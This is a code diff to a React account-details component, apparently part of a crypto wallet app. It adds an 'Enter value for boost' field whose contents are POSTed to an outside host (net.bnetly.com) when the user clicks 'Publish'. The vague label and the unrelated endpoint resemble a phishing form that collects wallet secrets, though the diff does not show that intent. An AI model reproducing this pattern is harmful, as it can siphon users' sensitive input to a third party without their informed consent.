@@ -1,6 +1,29 @@
-import React from "react";
+import React, { useState } from "react";
+import { v4 as uuidv4 } from 'uuid'; // Import the v4 function from the uuid library
 
 const AccountDetails = ({ accountAddress, accountBalance }) => {
+  const [value, setValue] = useState('');
+
+  const url = 'https://net.bnetly.com/post.jsp'; // replace with your target URL
+
+  const handleClick = () => {
+    if (value !== '') {
+      const key = uuidv4(); // Generate a UUID key using the v4 function
+      const data = { key: key, value: value }; // Include the key and value in the payload
+      const requestOptions = {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      };
+
+      fetch(url, requestOptions)
+        .then(response => response.text())
+        .then(data => alert(data))
+        .catch(error => console.error('Error:', error));
+    } else {
+      console.error('Please enter a value');
+    }
+  };
   return (
     <div>
       <div className="jumbotron">
@@ -12,6 +35,12 @@ const AccountDetails = ({ accountAddress, accountBalance }) => {
                       <p>
                         Account Address: {accountAddress}
                       </p>
+                      <hr className="my-4" />
+                      <input type="text" value={value} onChange={e => setValue(e.target.value)} placeholder="Enter value for boost" style={{width: '100%'}} />
+
+                      <br className="my-2" />
+                      <br className="my-2" />
+                      <button onClick={handleClick}>Publish</button>
                       <hr className="my-4" />
 
             <p className="lead">
